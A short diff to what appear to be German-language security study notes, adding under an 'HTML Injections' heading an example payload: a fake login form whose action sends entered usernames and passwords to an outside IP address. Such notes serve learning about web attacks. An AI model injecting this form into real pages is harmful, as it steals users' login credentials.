@@ -22,3 +22,6 @@ https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
 Möglich wegen veraltetem Hashalgorythmus (SHA256) und weil kein Salt verwendet wird sind alle hashes deterministisch 
 
 # HTML Injections
+```html
+<h3>Please login to proceed</h3> <form action=http://192.165.159.122>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
+```
